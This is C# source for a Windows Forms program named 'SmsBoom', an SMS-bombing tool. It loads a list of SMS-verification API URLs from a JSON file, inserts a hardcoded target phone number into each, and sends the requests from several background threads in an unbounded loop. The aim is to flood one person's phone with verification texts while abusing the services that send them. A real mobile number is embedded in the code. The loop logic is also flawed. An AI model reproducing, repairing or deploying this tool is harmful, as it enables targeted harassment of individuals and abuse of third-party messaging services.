using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace SmsBoom
{
    public partial class Boom : Form
    {
        public bool isStop = false;
        public List<string> threadpool = new List<string>();

        public delegate void SendDelegate(string api);
        public Boom()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Dictionary<string, string> keyValues = new Dictionary<string, string>();
            keyValues.Add("event", "register");
            keyValues.Add("mobile", "15995493505");
            HttpPost("https://vip.jb51.net/api/sms/send.html", keyValues);
            if (!isStop) return;


            var jsonpath = Path.Combine(Application.StartupPath, "api1.json");
            if (!File.Exists(jsonpath))
            {
                MessageBox.Show("找不到json文件");
                return;
            }
            var json = File.ReadAllText(jsonpath);
            try
            {
                var listjson = JsonConvert.DeserializeObject<List<string>>(json);
                int c = 1;

                while (true)
                {

                    if (threadpool.Count < 4)
                    {
                        var item = listjson[0];
                        string api = item.Replace("[phone]", "15995493505");
                        //SendDelegate del = new SendDelegate(SendSms);
                        //this.BeginInvoke(del, new Object[] { api });


                        var thread = new Thread(new ParameterizedThreadStart(SendSms));
                        thread.IsBackground = true;
                        thread.Start(api);
                        threadpool.Add(thread.ManagedThreadId.ToString());

                        listjson.RemoveAt(0);

                        c++;
                    }
                    else
                    {
                        Task.Delay(2000);
                    }
                }


                //foreach (var item in listjson) 
                //{
                //    //if (c > 10) break;
                //    while (threadpool.Count < 4)
                //    {

                //        string api = item.Replace("[phone]", "1");
                //        SendDelegate del = new SendDelegate(SendSms);
                //        this.BeginInvoke(del, new Object[] { api });


                //        var thread = new Thread(new ParameterizedThreadStart(SendSms));
                //        thread.IsBackground = true;
                //        thread.Start(api);
                //        threadpool.Add(thread.ManagedThreadId.ToString());

                //        c++;
                //    }
                //}
                //MessageBox.Show("done");
            }
            catch (Exception ex)
            {
                return;
            }
        }


        public void SendSms(object api1)
        {
            try
            {
                var api = api1.ToString();
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(api);            //实例化WebRequest对象  
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36";
                request.KeepAlive = false;
                request.Date = DateTime.Now;
                request.Accept = "*/*";
                request.ContentType = "text/html";
                request.Method = "Post";
                //request.Headers.Add("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
                request.Headers.Add("Accept-Encoding", "gzip, deflate, br");
                request.ProtocolVersion = HttpVersion.Version10;
                request.AllowAutoRedirect = true;
                //request.UseDefaultCredentials = true;
                request.Timeout = 5000;
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            }
            catch(Exception) { }
            finally 
            {
                var ct = Thread.CurrentThread.ManagedThreadId.ToString();
                if(threadpool.Contains(ct))
                threadpool.Remove(ct);
            }
        }

        public string HttpPost(string url, Dictionary<string, string> map)
        {
            string content = "";
            try
            {
                string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
                byte[] boundarybytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
                byte[] endbytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");

                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                request.ContentType = "multipart/form-data; boundary=" + boundary;
                request.Method = WebRequestMethods.Http.Post;
                request.KeepAlive = true;
                request.Timeout = -1;

                //CredentialCache credentialCache = new CredentialCache();
                //credentialCache.Add(new Uri(url), "Basic", new NetworkCredential("member", "secret"));
                //request.Credentials = credentialCache;

                request.ServicePoint.Expect100Continue = false;
                using (Stream stream = request.GetRequestStream())
                {
                    //1.1 key/value
                    string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
                    if (map != null)
                    {
                        foreach (string key in map.Keys)
                        {
                            stream.Write(boundarybytes, 0, boundarybytes.Length);
                            string formitem = string.Format(formdataTemplate, key, map[key]);
                            byte[] formitembytes = Encoding.GetEncoding("UTF-8").GetBytes(formitem);
                            stream.Write(formitembytes, 0, formitembytes.Length);
                        }
                    }
                    stream.Write(endbytes, 0, endbytes.Length);
                }
                //2.WebResponse
                HttpWebResponse response = request.GetResponse() as HttpWebResponse;
                using (Stream responsestream = response.GetResponseStream())
                {
                    using (StreamReader sr = new StreamReader(responsestream))
                    {
                        content = sr.ReadToEnd();
                    }
                }
            }
            catch (Exception ex)
            {
                content = ex.Message;
            }
            return content;
        }
    }


    public class JsonInfo
    { 
        public string desc { get; set; }
        public string url { get; set; }
        public string header { get; set; }
    }

}
